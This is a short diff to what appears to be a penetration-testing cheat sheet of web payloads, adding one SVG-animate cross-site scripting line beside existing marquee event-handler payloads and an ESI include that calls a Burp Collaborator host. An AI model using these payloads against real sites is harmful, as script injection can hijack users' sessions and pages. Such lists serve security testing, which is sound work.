@@ -73,6 +73,7 @@ Some helpful payloads caught in the wild
 <marquee loop=1 width=0 onfinish=confirm(1)>
 <marquee/onstart=alert(1)>
 <esi:include src="http://abcdef.burpcollaborator.net/" /><script>alert(1)</script>
+<svg><a><rect width=100% height=100% /><animate attributeName=href to=javascript:alert(document.location)>
 ```
 
 ### XXE  
